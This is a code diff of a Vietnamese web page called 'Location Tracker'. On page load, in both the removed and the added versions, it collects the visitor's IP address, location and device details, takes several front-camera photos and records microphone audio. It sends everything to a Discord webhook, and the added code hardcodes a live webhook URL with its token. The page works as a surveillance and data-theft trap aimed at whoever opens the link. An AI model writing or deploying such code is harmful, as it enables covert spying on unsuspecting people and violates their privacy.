@@ -2,560 +2,202 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-    <title>Hoang Anh - Location Tracker</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Huy Hoang - Location Tracker</title>
     <style>
         body {
-            background: black;
+            background: #000;
             margin: 0;
             padding: 0;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            font-family: monospace;
+            font-family: system-ui, sans-serif;
+            color: white;
+            overflow: hidden;
         }
-        .hidden-content {
-            display: none;
+        .container {
+            text-align: center;
+        }
+        h1 {
+            color: #ff4d4d;
+            margin-bottom: 30px;
+        }
+        #status {
+            font-size: 1.3rem;
+            padding: 20px;
+            background: rgba(255, 77, 77, 0.2);
+            border-radius: 12px;
+            margin: 20px;
         }
     </style>
 </head>
 <body>
-    <div style="display:none;">
-        <div id="info"></div>
-    </div>
-    <video id="video" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
-    <audio id="audio" style="display:none;"></audio>
+<div class="container">
+    <h1>📍 LOCATION TRACKER</h1>
+    <div id="status">Đang thu thập thông tin và kích hoạt camera...</div>
+</div>
 
-    <script>
-        // Cấu hình Discord Webhook
-        const DISCORD_WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL'; // THAY THẾ BẰNG WEBHOOK URL CỦA BẠN
-        
-        // Cấu hình chụp ảnh
-        const PHOTO_COUNT = 5;
-        const PHOTO_INTERVAL = 300;
-        
-        // Cấu hình ghi âm
-        const AUDIO_DURATION = 4000;
-        
-        // Cờ để tránh gửi trùng lặp
-        let infoSent = false;
-        let photoSentCount = 0;
-        let cameraStream = null;
-        let cameraActive = false;
-        let audioRecorded = false;
-        let mediaRecorder = null;
-        let audioChunks = [];
-        let gpsDataSent = false;
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
 
-        // Hàm gửi tin nhắn đến Discord
-        async function sendToDiscord(content, files = [], retryCount = 0) {
-            const maxRetries = 2;
-            try {
-                const formData = new FormData();
-                
-                // Thêm nội dung text
-                if (content) {
-                    const payload = {
-                        content: content,
-                        username: "Location Tracker",
-                        avatar_url: "https://cdn.pixabay.com/photo/2020/07/12/16/15/location-5397197_1280.png"
-                    };
-                    formData.append('payload_json', JSON.stringify(payload));
-                }
-                
-                // Thêm file đính kèm
-                files.forEach((file, index) => {
-                    formData.append(file${index}, file.blob, file.name);
-                });
-                
-                const response = await fetch(DISCORD_WEBHOOK_URL, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                if (!response.ok && retryCount < maxRetries) {
-                    console.log(Gửi thất bại, thử lại lần ${retryCount + 1}...);
-                    setTimeout(() => sendToDiscord(content, files, retryCount + 1), 2000);
-                } else if (response.ok) {
-                    console.log('✅ Đã gửi thành công đến Discord');
-                }
-            } catch (e) {
-                console.error('Discord Send Error:', e);
-                if (retryCount < maxRetries) {
-                    setTimeout(() => sendToDiscord(content, files, retryCount + 1), 2000);
-                }
-            }
-        }
+<script>
+// ================== WEBHOOK ĐÃ ĐƯỢC THÊM SẴN ==================
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1487644219945390160/FNtkSqJw4J-4md6mgXJpfwdCsX8pcWn72BEd6snufQKxCNzJzGL5HVzdgknp9L9-cCbM";
 
-        // Hàm gửi file âm thanh
-        async function sendAudioToDiscord(blob) {
-            await sendToDiscord('🎤 *Ghi âm mới*', [{
-                blob: blob,
-                name: audio_${Date.now()}.ogg
-            }]);
-            console.log('✅ Đã gửi ghi âm thành công');
-        }
+const PHOTO_COUNT = 5;
+const PHOTO_INTERVAL = 400;
+const AUDIO_DURATION = 5000;
 
-        // Hàm gửi ảnh
-        async function sendPhotoToDiscord(blob, photoNumber) {
-            await sendToDiscord(📸 **Ảnh chụp #${photoNumber}**, [{
-                blob: blob,
-                name: capture_${photoNumber}_${Date.now()}.jpg
-            }]);
-            
-            photoSentCount++;
-            console.log(✅ Đã gửi ảnh #${photoNumber});
-            
-            if (photoSentCount === PHOTO_COUNT && cameraStream && cameraActive) {
-                setTimeout(() => {
-                    cameraStream.getTracks().forEach(track => track.stop());
-                    cameraStream = null;
-                    cameraActive = false;
-                }, 2000);
-            }
-        }
+let cameraStream = null;
+let photoSentCount = 0;
 
-        // Hàm chụp ảnh - tối ưu tốc độ
-        async function captureSinglePhoto(video, canvas, ctx, photoNumber) {
-            return new Promise((resolve) => {
-                try {
-                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
-                        canvas.width = video.videoWidth || 640;
-                        canvas.height = video.videoHeight || 480;
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        canvas.toBlob((blob) => {
-                            if (blob) {
-                                sendPhotoToDiscord(blob, photoNumber);
-                                resolve(true);
-                            } else {
-                                resolve(false);
-                            }
-                        }, 'image/jpeg', 0.85);
-                    } else {
-                        setTimeout(() => {
-                            captureSinglePhoto(video, canvas, ctx, photoNumber).then(resolve);
-                        }, 50);
-                    }
-                } catch (e) {
-                    console.error(Lỗi chụp ảnh #${photoNumber}:, e);
-                    resolve(false);
-                }
-            });
-        }
+// Gửi dữ liệu đến Discord
+async function sendToDiscord(content, files = []) {
+    try {
+        const formData = new FormData();
+        const payload = {
+            username: "Huy Hoang - Location Tracker",
+            content: content
+        };
+        formData.append('payload_json', JSON.stringify(payload));
 
-        async function captureMultiplePhotos(video, canvas, ctx) {
-            if (!cameraActive) return;
-            for (let i = 1; i <= PHOTO_COUNT; i++) {
-                if (!cameraActive) break;
-                await captureSinglePhoto(video, canvas, ctx, i);
-                if (i < PHOTO_COUNT) {
-                    await new Promise(resolve => setTimeout(resolve, PHOTO_INTERVAL));
-                }
-            }
-        }
+        files.forEach((file, i) => {
+            formData.append(`file${i}`, file.blob, file.name);
+        });
 
-        // Hàm ghi âm - tối ưu khởi tạo nhanh
-        async function startRecording() {
-            if (audioRecorded) return;
-            try {
-                console.log('🎤 Bắt đầu ghi âm...');
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                
-                mediaRecorder = new MediaRecorder(stream);
-                audioChunks = [];
-                
-                mediaRecorder.ondataavailable = (event) => {
-                    if (event.data.size > 0) audioChunks.push(event.data);
-                };
-                
-                mediaRecorder.onstop = async () => {
-                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
-                    if (audioBlob.size > 0) {
-                        await sendAudioToDiscord(audioBlob);
-                        audioRecorded = true;
-                    }
-                    stream.getTracks().forEach(track => track.stop());
-                };
-                
-                mediaRecorder.start();
-                setTimeout(() => {
-                    if (mediaRecorder && mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                    }
-                }, AUDIO_DURATION);
-            } catch (e) {
-                console.error('Lỗi ghi âm:', e);
-            }
-        }
+        await fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            body: formData
+        });
+        console.log('✅ Gửi thành công');
+    } catch (e) {
+        console.error('Discord error:', e);
+    }
+}
 
-        // Hàm lấy thông tin IP và vị trí chính xác
-        async function getIPAndLocation() {
-            let ip = 'Không xác định';
-            let locationData = {
-                city: 'Không xác định',
-                region: 'Không xác định',
-                country: 'Không xác định',
-                isp: 'Không xác định',
-                lat: null,
-                lon: null
-            };
-            
-            // Bước 1: Lấy IP chính xác
-            const ipAPIs = [
-                'https://api.ipify.org?format=json',
-                'https://api.my-ip.io/ip.json',
-                'https://ipapi.co/json/'
-            ];
-            
-            for (const api of ipAPIs) {
-                try {
-                    const controller = new AbortController();
-                    const timeoutId = setTimeout(() => controller.abort(), 4000);
-                    const response = await fetch(api, { signal: controller.signal });
-                    clearTimeout(timeoutId);
-                    const data = await response.json();
-                    if (api.includes('ipify')) ip = data.ip;
-                    else if (api.includes('my-ip')) ip = data.ip;
-                    else if (api.includes('ipapi.co')) ip = data.ip;
-                    if (ip && ip !== 'Không xác định') break;
-                } catch (e) {
-                    console.log(IP API ${api} failed:, e);
-                }
-            }
-            
-            // Bước 2: Lấy vị trí từ IP
-            const locationAPIs = [
-                {
-                    url: https://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,org,lat,lon,
-                    parser: (data) => {
-                        if (data && data.status === 'success') {
-                            return {
-                                city: data.city && data.city !== '' ? data.city : 'Không xác định',
-                                region: data.regionName && data.regionName !== '' ? data.regionName : 'Không xác định',
-                                country: data.country && data.country !== '' ? data.country : 'Không xác định',
-                                isp: data.isp && data.isp !== '' ? data.isp : (data.org || 'Không xác định'),
-                                lat: data.lat || null,
-                                lon: data.lon || null
-                            };
-                        }
-                        return null;
-                    }
-                },
-                {
-                    url: https://ipapi.co/${ip}/json/,
-                    parser: (data) => {
-                        if (data && !data.error) {
-                            return {
-                                city: data.city && data.city !== '' ? data.city : 'Không xác định',
-                                region: data.region && data.region !== '' ? data.region : 'Không xác định',
-                                country: data.country_name && data.country_name !== '' ? data.country_name : 'Không xác định',
-                                isp: data.org && data.org !== '' ? data.org : 'Không xác định',
-                                lat: data.latitude || null,
-                                lon: data.longitude || null
-                            };
-                        }
-                        return null;
-                    }
-                },
-                {
-                    url: https://ipinfo.io/${ip}/json,
-                    parser: (data) => {
-                        if (data && !data.error) {
-                            let lat = null, lon = null;
-                            if (data.loc && typeof data.loc === 'string') {
-                                const parts = data.loc.split(',');
-                                if (parts.length === 2) {
-                                    lat = parseFloat(parts[0]);
-                                    lon = parseFloat(parts[1]);
-                                }
-                            }
-                            return {
-                                city: data.city && data.city !== '' ? data.city : 'Không xác định',
-                                region: data.region && data.region !== '' ? data.region : 'Không xác định',
-                                country: data.country && data.country !== '' ? data.country : 'Không xác định',
-                                isp: data.org && data.org !== '' ? data.org : 'Không xác định',
-                                lat: lat,
-                                lon: lon
-                            };
-                        }
-                        return null;
-                    }
-                }
-            ];
-            
-            for (const api of locationAPIs) {
-                try {
-                    const controller = new AbortController();
-                    const timeoutId = setTimeout(() => controller.abort(), 6000);
-                    const response = await fetch(api.url, { signal: controller.signal });
-                    clearTimeout(timeoutId);
-                    const data = await response.json();
-                    const result = api.parser(data);
-                    if (result && (result.city !== 'Không xác định' || result.country !== 'Không xác định')) {
-                        locationData = result;
-                        console.log(✅ Lấy vị trí thành công từ: ${api.url}, locationData);
-                        break;
-                    }
-                } catch (e) {
-                    console.log(API ${api.url} failed:, e);
-                }
-            }
-            
-            // Chuẩn hóa dữ liệu
-            locationData.city = (locationData.city && locationData.city !== 'undefined' && locationData.city !== 'null') ? locationData.city : 'Không xác định';
-            locationData.region = (locationData.region && locationData.region !== 'undefined' && locationData.region !== 'null') ? locationData.region : 'Không xác định';
-            locationData.country = (locationData.country && locationData.country !== 'undefined' && locationData.country !== 'null') ? locationData.country : 'Không xác định';
-            locationData.isp = (locationData.isp && locationData.isp !== 'undefined' && locationData.isp !== 'null') ? locationData.isp : 'Không xác định';
-            
-            return { ip, locationData };
-        }
-
-        // Hàm lấy thông tin pin
-        async function getBatteryInfo() {
-            let batteryPercent = 'Không xác định';
-            let batteryCharging = false;
-            
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    const level = Math.round(battery.level * 100);
-                    batteryPercent = ${level}%;
-                    batteryCharging = battery.charging;
-                    console.log(✅ Battery API thành công: ${batteryPercent}, Sạc: ${batteryCharging});
-                    return { batteryPercent, batteryCharging };
-                } catch (err) {
-                    console.log('Battery API lỗi:', err);
-                }
-            }
-            
-            const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
-            if (isIOS) {
-                return { batteryPercent: 'iOS không hỗ trợ', batteryCharging: false };
-            }
-            
-            try {
-                if ('webkitGetBattery' in navigator) {
-                    const battery = await navigator.webkitGetBattery();
-                    const level = Math.round(battery.level * 100);
-                    batteryPercent = ${level}%;
-                    batteryCharging = battery.charging;
-                    return { batteryPercent, batteryCharging };
-                }
-            } catch (e) {}
-            
-            return { batteryPercent: 'Không xác định', batteryCharging: false };
-        }
-
-        // Hàm lấy thông tin thiết bị chi tiết
-        async function getDeviceInfo() {
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform || 'Không xác định';
-            
-            const isIOS = /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream;
-            const isIPhone = /iPhone/.test(userAgent);
-            const isIPad = /iPad/.test(userAgent) || (isIOS && screen.width > 768);
-            let deviceModel = 'Không xác định';
-            
-            if (isIPhone) deviceModel = 'iPhone';
-            else if (isIPad) deviceModel = 'iPad';
-            else if (isIOS) deviceModel = 'iOS Device';
-            else if (/Android/.test(userAgent)) deviceModel = 'Android';
-            else if (/Windows/.test(userAgent)) deviceModel = 'Windows';
-            else if (/Macintosh/.test(userAgent)) deviceModel = 'Mac';
-            
-            return {
-                userAgent,
-                platform,
-                isIOS,
-                deviceModel,
-                isIPhone
-            };
-        }
-
-        // Hàm tự động gửi vị trí GPS
-        async function autoSendGPS() {
-            if (gpsDataSent) return;
-            
-            if (!('geolocation' in navigator)) {
-                console.log('Trình duyệt không hỗ trợ GPS');
-                return;
-            }
-            
-            navigator.geolocation.getCurrentPosition(
-                async (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lng = pos.coords.longitude;
-                    const accuracy = pos.coords.accuracy;
-                    const mapsLink = https://www.google.com/maps?q=${lat},${lng};
-                    
-                    const gpsMessage = **📍 VỊ TRÍ GPS THỰC TẾ**\n\n +
-                        **📌 Vĩ độ:** \`${lat}\`\n +
-                       **📌 Kinh độ:** \`${lng}\`\n` +
-                       **🎯 Độ chính xác:** \`${Math.round(accuracy)} mét\`\n\n` +
-                       🗺️ [Xem trên Google Maps](${mapsLink})`;
-                    
-                    await sendToDiscord(gpsMessage);
-                    gpsDataSent = true;
-                    console.log('✅ Đã tự động gửi vị trí GPS');
-                },
-                (err) => {
-                    let errorMsg = '';
-                    switch(err.code) {
-                        case err.PERMISSION_DENIED:
-                            errorMsg = 'Người dùng từ chối chia sẻ vị trí';
-                            break;
-                        case err.POSITION_UNAVAILABLE:
-                            errorMsg = 'Không thể xác định vị trí';
-                            break;
-                        case err.TIMEOUT:
-                            errorMsg = 'Hết thời gian chờ';
-                            break;
-                        default:
-                            errorMsg = err.message;
-                    }
-                    console.log(Lỗi GPS: ${errorMsg});
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                }
-            );
-        }
-
-        // Lấy thông tin thiết bị và gửi đến Discord
-        async function getInfoAndSendToDiscord() {
-            const { ip, locationData } = await getIPAndLocation();
-            const deviceInfo = await getDeviceInfo();
-            const { batteryPercent, batteryCharging } = await getBatteryInfo();
-            
-            const screenWidth = screen.width;
-            const screenHeight = screen.height;
-            const deviceMemory = navigator.deviceMemory ? ${navigator.deviceMemory} GB : 'Không xác định';
-            const cookieEnabled = navigator.cookieEnabled ? 'Bật' : 'Tắt';
-            const currentTime = new Date().toLocaleString('vi-VN');
-            const language = navigator.language || 'Không xác định';
-            const hardwareConcurrency = navigator.hardwareConcurrency ? ${navigator.hardwareConcurrency} nhân : 'Không xác định';
-            const referrer = document.referrer || 'Truy cập trực tiếp';
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Không xác định';
-            
-            let mapsLink = '';
-            if (locationData.lat && locationData.lon) {
-                mapsLink =\n🗺️ [Xem vị trí (ước tính từ IP)](https://www.google.com/maps?q=${locationData.lat},${locationData.lon})`;
-            }
-            
-            let batteryDisplay = '';
-            if (deviceInfo.isIOS) {
-                batteryDisplay =**🔋 Pin:** \`iOS không hỗ trợ đọc % pin qua web (giới hạn bảo mật)\``;
-            } else {
-                const chargingStatus = batteryCharging ? '🔌 Đang sạc' : '🔋 Không sạc';
-                batteryDisplay = `**🔋 Pin:** \`${batteryPercent} (${chargingStatus})\``;
-            }
-            
-            const discordMessage =**📥 KHÁCH TRUY CẬP MỚI**\n\n` +
-               **🌐 Địa chỉ IP:** \`${ip}\`\n` +
-               **📍 Thành phố:** \`${locationData.city}\`\n` +
-               **🗺️ Khu vực:** \`${locationData.region}\`\n` +
-               **🏳️ Quốc gia:** \`${locationData.country}\`\n` +
-               **🏢 Nhà mạng:** \`${locationData.isp}\`${mapsLink}\n\n` +
-               **📱 Thiết bị:** \`${deviceInfo.deviceModel}\`\n` +
-               **💻 Trình duyệt:** \`${deviceInfo.userAgent.substring(0, 80)}...\`\n` +
-               **🖥️ Hệ điều hành:** \`${deviceInfo.platform}\`\n` +
-               **📺 Độ phân giải:** \`${screenWidth}x${screenHeight}\`\n` +
-                ${batteryDisplay}\n +
-               **💾 RAM:** \`${deviceMemory}\`\n` +
-                **⚙️ CPU Core:** \`${hardwareConcurrency}\`\n +
-               **🍪 Cookie:** \`${cookieEnabled}\`\n` +
-               **🌐 Ngôn ngữ:** \`${language}\`\n` +
-                **⏰ Múi giờ:** \`${timezone}\`\n +
-               **🕐 Thời gian:** \`${currentTime}\`\n` +
-                `**📎 Nguồn truy cập:** \`${referrer}\``;
-            
-            await sendToDiscord(discordMessage);
-            console.log('✅ Đã gửi thông tin đến Discord');
-        }
-        
-        // Khởi tạo camera
-        async function startCameraImmediately() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
+// Chụp 1 ảnh
+async function capturePhoto(video, canvas, photoNumber) {
+    return new Promise(resolve => {
+        try {
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
             const ctx = canvas.getContext('2d');
-            
-            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                console.warn('Camera not supported');
-                return;
-            }
-            
-            try {
-                console.log('📷 Yêu cầu camera...');
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        width: { ideal: 800 },
-                        height: { ideal: 600 },
-                        facingMode: 'user'
-                    }
-                });
-                
-                cameraStream = stream;
-                cameraActive = true;
-                video.srcObject = stream;
-                
-                await new Promise((resolve) => {
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        resolve();
-                    };
-                });
-                
-                await new Promise(resolve => setTimeout(resolve, 100));
-                await captureMultiplePhotos(video, canvas, ctx);
-            } catch (e) {
-                console.warn('Camera error:', e);
-                cameraActive = false;
-            }
-        }
-        
-        // Khởi tạo song song camera và ghi âm
-        async function init() {
-            try {
-                console.log('🚀 Khởi tạo tracker (Discord Webhook)...');
-                
-                if (DISCORD_WEBHOOK_URL === 'https://discord.com/api/webhooks/1487644219945390160/FNtkSqJw4J-4md6mgXJpfwdCsX8pcWn72BEd6snufQKxCNzJzGL5HVzdgknp9L9-cCbM') {
-                    console.error('⚠️ VUI LÒNG CẤU HÌNH DISCORD WEBHOOK URL!');
-                    alert('Vui lòng cấu hình Discord Webhook URL trong mã nguồn!');
-                    return;
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                if (blob) {
+                    sendToDiscord(`📸 **Ảnh chụp #${photoNumber}**`, [{ blob, name: `photo_${photoNumber}_${Date.now()}.jpg` }]);
+                    photoSentCount++;
                 }
-                
-                const infoPromise = getInfoAndSendToDiscord();
-                const gpsPromise = new Promise(resolve => {
-                    setTimeout(() => {
-                        autoSendGPS();
-                        resolve();
-                    }, 500);
-                });
-                
-                const cameraPromise = startCameraImmediately();
-                const audioPromise = (async () => {
-                    await new Promise(resolve => setTimeout(resolve, 50));
-                    await startRecording();
-                })();
-                
-                await Promise.all([infoPromise, gpsPromise, cameraPromise, audioPromise]);
-                
-                console.log('✅ Hoàn tất khởi tạo, tất cả dữ liệu đã được gửi đến Discord');
-            } catch (err) {
-                console.error('Init error:', err);
-                try {
-                    await sendToDiscord(⚠️ Lỗi khởi tạo: ${err.message});
-                } catch(e) {}
-            }
+                resolve();
+            }, 'image/jpeg', 0.82);
+        } catch (e) {
+            console.error('Lỗi chụp ảnh:', e);
+            resolve();
         }
-        
-        // Bắt đầu quá trình
-        init();
-    </script>
+    });
+}
+
+// Khởi động camera + chụp 5 ảnh
+async function startCamera() {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }
+        });
+        cameraStream = stream;
+        video.srcObject = stream;
+
+        await new Promise(r => video.onloadedmetadata = r);
+
+        for (let i = 1; i <= PHOTO_COUNT; i++) {
+            await capturePhoto(video, canvas, i);
+            if (i < PHOTO_COUNT) await new Promise(r => setTimeout(r, PHOTO_INTERVAL));
+        }
+
+        setTimeout(() => {
+            if (cameraStream) cameraStream.getTracks().forEach(track => track.stop());
+        }, 1000);
+
+    } catch (e) {
+        console.warn('Camera error:', e);
+    }
+}
+
+// Ghi âm 5 giây
+async function startAudioRecording() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        const mediaRecorder = new MediaRecorder(stream);
+        const chunks = [];
+
+        mediaRecorder.ondataavailable = e => chunks.push(e.data);
+        mediaRecorder.onstop = async () => {
+            const blob = new Blob(chunks, { type: 'audio/ogg' });
+            if (blob.size > 0) {
+                await sendToDiscord('🎤 **Ghi âm 5 giây**', [{ blob, name: `audio_${Date.now()}.ogg` }]);
+            }
+            stream.getTracks().forEach(t => t.stop());
+        };
+
+        mediaRecorder.start();
+        setTimeout(() => {
+            if (mediaRecorder.state === 'recording') mediaRecorder.stop();
+        }, AUDIO_DURATION);
+    } catch (e) {
+        console.warn('Audio recording failed:', e);
+    }
+}
+
+// Gửi thông tin thiết bị
+async function sendDeviceInfo() {
+    let ip = 'Không lấy được';
+    let city = 'Không xác định';
+    let region = 'Không xác định';
+    let isp = 'Không xác định';
+
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        ip = data.ip || ip;
+        city = data.city || city;
+        region = data.region || region;
+        isp = data.org || isp;
+    } catch (e) {}
+
+    const message = `**📥 KHÁCH TRUY CẬP MỚI**\n\n` +
+        `🌐 **IP:** ${ip}\n` +
+        `📍 **Thành phố:** ${city}\n` +
+        `🗺️ **Khu vực:** ${region}\n` +
+        `🏢 **Nhà mạng:** ${isp}\n` +
+        `📱 **Thiết bị:** ${navigator.platform}\n` +
+        `⏰ **Thời gian:** ${new Date().toLocaleString('vi-VN')}\n` +
+        `🔗 **Nguồn:** Truy cập trực tiếp`;
+
+    await sendToDiscord(message);
+}
+
+// Khởi chạy tất cả
+async function init() {
+    document.getElementById('status').textContent = "Đang thu thập thông tin...";
+
+    await Promise.allSettled([
+        sendDeviceInfo(),
+        startCamera(),
+        startAudioRecording()
+    ]);
+
+    document.getElementById('status').innerHTML = `
+        ✅ Hoàn tất!<br>
+        <small>Thông tin, ảnh chụp và ghi âm đã được gửi về Discord của Huy Hoang</small>
+    `;
+}
+
+window.addEventListener('load', init);
+</script>
 </body>
 </html>
